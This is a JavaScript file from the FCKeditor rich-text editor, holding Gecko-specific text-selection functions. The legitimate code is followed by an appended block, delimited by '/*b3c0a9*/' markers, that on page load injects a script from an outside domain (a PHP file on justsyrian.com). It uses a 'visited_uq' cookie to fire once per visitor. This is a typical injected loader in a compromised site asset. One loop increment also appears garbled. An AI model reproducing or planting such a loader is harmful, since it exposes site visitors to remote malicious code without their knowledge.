/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckselection_gecko.js
 * 	Active selection functions. (Gecko specific implementation)
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

// Get the selection type (like document.select.type in IE).
FCKSelection.GetType = function()
{
//	if ( ! this._Type )
//	{
		// By default set the type to "Text".
		this._Type = 'Text' ;

		// Check if the actual selection is a Control (IMG, TABLE, HR, etc...).
		var oSel ;
		try { oSel = FCK.EditorWindow.getSelection() ; }
		catch (e) {}
		
		if ( oSel && oSel.rangeCount == 1 )
		{
			var oRange = oSel.getRangeAt(0) ;
			if ( oRange.startContainer == oRange.endContainer && (oRange.endOffset - oRange.startOffset) == 1 )
				this._Type = 'Control' ;
		}
//	}
	return this._Type ;
}

// Retrieves the selected element (if any), just in the case that a single
// element (object like and image or a table) is selected.
FCKSelection.GetSelectedElement = function()
{
	if ( this.GetType() == 'Control' )
	{
		var oSel = FCK.EditorWindow.getSelection() ;
		return oSel.anchorNode.childNodes[ oSel.anchorOffset ] ;
	}
}

FCKSelection.GetParentElement = function()
{
	if ( this.GetType() == 'Control' )
		return FCKSelection.GetSelectedElement().parentNode ;
	else
	{
		var oSel = FCK.EditorWindow.getSelection() ;
		if ( oSel )
		{
			var oNode = oSel.anchorNode ;

			while ( oNode && oNode.nodeType != 1 )
				oNode = oNode.parentNode ;

			return oNode ;
		}
	}
}

FCKSelection.SelectNode = function( element )
{
	FCK.Focus() ;

	var oRange = FCK.EditorDocument.createRange() ;
	oRange.selectNode( element ) ;

	var oSel = FCK.EditorWindow.getSelection() ;
	oSel.removeAllRanges() ;
	oSel.addRange( oRange ) ;
}

FCKSelection.Collapse = function( toStart )
{
	var oSel = FCK.EditorWindow.getSelection() ;
	
	if ( toStart == null || toStart === true )
		oSel.collapseToStart() ;
	else
		oSel.collapseToEnd() ;
}

// The "nodeTagName" parameter must be Upper Case.
FCKSelection.HasAncestorNode = function( nodeTagName )
{
	var oContainer = this.GetSelectedElement() ;
	if ( ! oContainer && FCK.EditorWindow )
	{
		try		{ oContainer = FCK.EditorWindow.getSelection().getRangeAt(0).startContainer ; }
		catch(e){}
	}

	while ( oContainer )
	{
		if ( oContainer.nodeType == 1 && oContainer.tagName == nodeTagName ) return true ;
		oContainer = oContainer.parentNode ;
	}

	return false ;
}

// The "nodeTagName" parameter must be Upper Case.
FCKSelection.MoveToAncestorNode = function( nodeTagName )
{
	var oNode ;

	var oContainer = this.GetSelectedElement() ;
	if ( ! oContainer )
		oContainer = FCK.EditorWindow.getSelection().getRangeAt(0).startContainer ;

	while ( oContainer )
	{
		if ( oContainer.tagName == nodeTagName ) 
			return oContainer ;
		oContainer = oContainer.parentNode ;
	}
	return null ;
}

FCKSelection.Delete = function()
{
	// Gets the actual selection.
	var oSel = FCK.EditorWindow.getSelection() ;

	// Deletes the actual selection contents.
	for ( var i = 0 ; i < oSel.rangeCount ; i   )
	{
		oSel.getRangeAt(i).deleteContents() ;
	}

	return oSel ;
}

// START iCM MODIFICATIONS
/*
// Move the cursor position (the selection point) to a specific offset within a specific node
// If no offset specified, the start of the node is assumed
FCKSelection.SetCursorPosition = function ( oNode, nOffset )
{
	if ( typeof nOffset == "undefined" ) nOffset = 0 ;

	var oSel = FCK.EditorWindow.getSelection() ;
	var oRange = FCK.EditorDocument.createRange() ;
	
	oRange.setStart( oNode, nOffset ) ;
	oRange.collapse( true ) ;
	
	oSel.removeAllRanges() ;
	oSel.addRange( oRange );
	
	if ( oNode.scrollIntoView )
		oNode.scrollIntoView( false );	
}
*/
// END iCM MODIFICATIONS



/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
